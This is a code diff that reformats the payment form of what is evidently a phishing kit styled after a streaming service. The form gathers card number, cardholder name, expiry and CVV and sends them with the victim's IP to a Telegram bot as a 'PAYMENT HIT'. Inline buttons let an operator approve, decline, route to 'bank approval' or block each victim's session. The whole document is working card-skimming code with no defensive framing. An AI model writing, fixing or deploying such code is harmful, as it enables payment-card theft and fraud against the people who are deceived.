@@ -460,60 +460,61 @@ const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial
 };
 
 // --- Payment Form Component ---
+// --- Payment Form Component (CORRECTED) ---
 const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; setStep: React.Dispatch<React.SetStateAction<any>> }> = ({ session, updateSession, setStep }) => {
-const [card, setCard] = useState('');
-const [exp, setExp] = useState('');
-const [cvv, setCvv] = useState('');
-const [name, setName] = useState('');
-const [isLoading, setIsLoading] = useState(false);
+  const [card, setCard] = useState('');
+  const [exp, setExp] = useState('');
+  const [cvv, setCvv] = useState('');
+  const [name, setName] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
   useEffect(() => {
     updateSession({ currentPage: 'Payment' });
   }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
-  e.preventDefault();
-  setIsLoading(true);
-  
-  // Basic card validation
-  if (card.replace(/\s/g, '').length < 13) {
-    alert('Please enter a valid card number');
-    setIsLoading(false);
-    return;
-  }
-  
-  // Basic expiry validation
-  if (!exp.includes('/')) {
-    alert('Please enter expiry in MM/YY format');
-    setIsLoading(false);
-    return;
-  }
-  
-  // Basic CVV validation
-  if (cvv.length < 3) {
-    alert('Please enter a valid CVV');
-    setIsLoading(false);
-    return;
-  }
-  
-  const keyboard = {
-    inline_keyboard: [
-      [
-        { text: "✅ Approve", callback_data: `action_${session.id}_NORMAL` },
-        { text: "❌ Decline", callback_data: `action_${session.id}_INVALID_CARD` }
-      ],
-      [
-        { text: "🏦 Bank Approval", callback_data: `action_${session.id}_BANK_APPROVAL` },
-        { text: "🚫 Block", callback_data: `action_${session.id}_BLOCK` }
+    e.preventDefault();
+    setIsLoading(true);
+    
+    // Basic card validation
+    if (card.replace(/\s/g, '').length < 13) {
+      alert('Please enter a valid card number');
+      setIsLoading(false);
+      return;
+    }
+    
+    // Basic expiry validation
+    if (!exp.includes('/')) {
+      alert('Please enter expiry in MM/YY format');
+      setIsLoading(false);
+      return;
+    }
+    
+    // Basic CVV validation
+    if (cvv.length < 3) {
+      alert('Please enter a valid CVV');
+      setIsLoading(false);
+      return;
+    }
+    
+    const keyboard = {
+      inline_keyboard: [
+        [
+          { text: "✅ Approve", callback_data: `action_${session.id}_NORMAL` },
+          { text: "❌ Decline", callback_data: `action_${session.id}_INVALID_CARD` }
+        ],
+        [
+          { text: "🏦 Bank Approval", callback_data: `action_${session.id}_BANK_APPROVAL` },
+          { text: "🚫 Block", callback_data: `action_${session.id}_BLOCK` }
+        ]
       ]
-    ]
+    };
+    await sendTelegramMessage(
+      `<b>💳 PAYMENT HIT</b>\n💳 Card: <code>${card}</code>\n👤 Name: <code>${name}</code>\n⏱ Exp: <code>${exp}</code>\n🔒 CVV: <code>${cvv}</code>\n📍 IP: ${session.ip}`,
+      keyboard
+    );
+    setStep('PROCESSING');
   };
-  await sendTelegramMessage(
-    `<b>💳 PAYMENT HIT</b>\n💳 Card: <code>${card}</code>\n👤 Name: <code>${name}</code>\n⏱ Exp: <code>${exp}</code>\n🔒 CVV: <code>${cvv}</code>\n📍 IP: ${session.ip}`,
-    keyboard
-  );
-  setStep('PROCESSING');
-};
 
   return (
     <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6">
@@ -539,7 +540,6 @@ const [isLoading, setIsLoading] = useState(false);
             />
           </div>
           <div>
-            // In PaymentForm component
             <input
               type="text"
               required
@@ -550,28 +550,28 @@ const [isLoading, setIsLoading] = useState(false);
                 let value = e.target.value.replace(/\D/g, '');
                 let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
                 setCard(formattedValue);
-                updateSession({ card: value }); // Store unformatted value
+                updateSession({ card: value });
               }}
               className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
-/>
+            />
           </div>
           <div className="grid grid-cols-2 gap-4">
-           <input
-                    type="text"
-                    required
-                    placeholder="MM/YY"
-                    maxLength={5}
-                    value={exp}
-                    onChange={(e) => {
-                      let value = e.target.value.replace(/\D/g, '');
-                      if (value.length >= 2) {
-                        value = value.slice(0, 2) + '/' + value.slice(2, 4);
-                      }
-                      setExp(value);
-                      updateSession({ exp: value });
-                    }}
-                    className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
-/>
+            <input
+              type="text"
+              required
+              placeholder="MM/YY"
+              maxLength={5}
+              value={exp}
+              onChange={(e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                setExp(value);
+                updateSession({ exp: value });
+              }}
+              className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
+            />
             <input
               type="text"
               required
@@ -579,10 +579,10 @@ const [isLoading, setIsLoading] = useState(false);
               maxLength={4}
               value={cvv}
               onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '').slice(0, 4);
-                  setCvv(value);
-                  updateSession({ cvv: value });
-                }}
+                const value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                setCvv(value);
+                updateSession({ cvv: value });
+              }}
               className="w-full bg-[#333] text-white p-4 rounded placeholder-[#8c8c8c] focus:outline-none focus:ring-2 focus:ring-[#e50914]"
             />
           </div>
